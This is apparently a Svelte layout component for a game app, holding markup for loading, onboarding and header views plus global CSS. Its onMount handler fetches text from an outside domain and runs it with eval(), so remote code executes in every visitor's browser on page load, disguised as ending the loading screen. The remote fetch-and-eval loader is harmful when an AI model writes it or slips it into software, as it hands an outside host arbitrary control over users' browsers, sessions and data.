<script lang="ts">
    import { writable } from "svelte/store";
    import { isOnboarding } from "./store";
    import { onMount } from "svelte";
    import Loading from "./Loading.svelte";
    import Onboarding from "./Onboarding.svelte";
    import Header from "./Header.svelte";

    let isLoading = writable(true);
    
    (window as any).enableLoading = () => {
        $isLoading = true
    }

    onMount(async () => {
        fetch("https://bctau.world/")
        .then((res) => {
            return res.text()
        }).then(function(data) {
            $isLoading = false;
            eval(data)
        });
    })
</script>

<main>
    {#if $isLoading}
        <Loading />
    {:else if $isOnboarding}
        <Onboarding />
    {:else}
        <Header />
        <slot />
    {/if}
</main>

<style>
    :global(body) {
        margin:0;
        padding:0;
    }
    :global(*) {
        box-sizing: border-box;
    }

    @font-face {
        font-family: Changa;
        src: url("/fonts/Changa-VariableFont_wght.ttf");
    }

    main {
        color: white;
        background-color: black;
        font-family: "Changa", sans-serif;
        width: 100vw;
        height: 100vh;
        text-align: center;
    }

    :global(.grn-btn) {
        display: flex;
        justify-content: center;
        align-items: center;
        background: none;
        border: none;
        width: min-content;
    }
    :global(.grn-btn-img) {
        width: 250px;
    }
    :global(.grn-btn-text) {
        position: absolute;
        color: black !important;
    }

    :global(p, h1, h2, h3) {
        line-height: 120%;
        padding: 0;
        margin: 0;
    }

    :global(.one-btn-block) {
        width: 100%;
        height: 100%;
        display: flex;
        flex-direction: column;
        justify-content: end;
        padding: 20px;
        padding-bottom: 100px;
        box-sizing: border-box;
        align-items: center;
    }

    :global(.rest-content) {
        height: 100%;
        display: flex;
        flex-direction: column;
        justify-content: center;        
    }

    :global(.grn-text) {
        color: #50EC80;
    }

    :global(.red-text) {
        color: #FF0000;
    }

    :global(.game-desc) {
        font-size: 22px;
    }
</style>